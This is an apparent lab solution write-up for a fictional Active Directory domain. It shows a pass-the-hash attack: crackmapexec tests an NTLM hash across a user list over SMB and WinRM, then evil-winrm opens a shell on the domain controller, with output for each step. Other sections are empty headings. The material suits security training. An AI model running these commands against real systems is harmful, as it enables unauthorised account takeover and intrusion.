# Linux Solutions
## Pass the Hash
Enumerate smb to see what user has this hash:
```
crackmapexec smb 192.168.21.174 -u users.txt -H 9480f234e713cf0dd846f5b006c5ea6e 
SMB         192.168.21.174  445    SCRANTON-DC      [*] Windows 10.0 Build 20348 x64 (name:SCRANTON-DC) (domain:dunder-mifflin.local) (signing:True) (SMBv1:False)
SMB         192.168.21.174  445    SCRANTON-DC      [-] dunder-mifflin.local\k.malone:9480f234e713cf0dd846f5b006c5ea6e STATUS_LOGON_FAILURE 
SMB         192.168.21.174  445    SCRANTON-DC      [+] dunder-mifflin.local\d.schrute:9480f234e713cf0dd846f5b006c5ea6e
```

Check to see if this user has winrm access.
```
crackmapexec winrm 192.168.21.174 -u d.schrute -H 9480f234e713cf0dd846f5b006c5ea6e 
SMB         192.168.21.174  5986   SCRANTON-DC      [*] Windows 10.0 Build 20348 (name:SCRANTON-DC) (domain:dunder-mifflin.local)
HTTP        192.168.21.174  5986   SCRANTON-DC      [*] https://192.168.21.174:5986/wsman
WINRM       192.168.21.174  5986   SCRANTON-DC      [+] dunder-mifflin.local\d.schrute:9480f234e713cf0dd846f5b006c5ea6e (Pwn3d!)
```

Authenticate with winrm:
```
evil-winrm -i 192.168.21.174 -u d.schrute -H 9480f234e713cf0dd846f5b006c5ea6e

*Evil-WinRM* PS C:\Users\d.schrute\Documents> whoami
dunder-mifflin\d.schrute
*Evil-WinRM* PS C:\Users\d.schrute\Documents> hostname
scranton-dc
```

## ASREProasting
## Kerberoasting

# Windows solutions
## Pass the Hash
## ASREProasting
## Kerberoasting
